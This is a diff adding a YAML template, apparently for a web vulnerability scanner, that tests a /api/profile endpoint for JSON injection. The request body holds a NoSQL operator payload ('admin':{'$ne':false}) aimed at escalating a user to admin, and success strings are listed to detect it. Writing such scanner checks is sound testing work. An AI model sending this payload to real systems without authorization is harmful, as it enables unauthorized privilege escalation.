@@ -1,0 +1,25 @@
+name: JSON注入测试
+description: 测试JSON注入漏洞
+level: 中
+author: Test
+request:
+  method: POST
+  path: /api/profile
+  params:
+    action: "update"
+  headers:
+    Content-Type: "application/json"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    Accept: "application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+  body: "{\"name\":\"test\",\"role\":\"user\",\"admin\":{\"$ne\":false}}"
+response:
+  matchType: contains
+  successIndicators:
+    - "admin"
+    - "administrator"
+    - "管理员"
+  errorIndicators:
+    - "invalid JSON"
+    - "update failed"
+    - "更新失败"
+  statusCode: 200
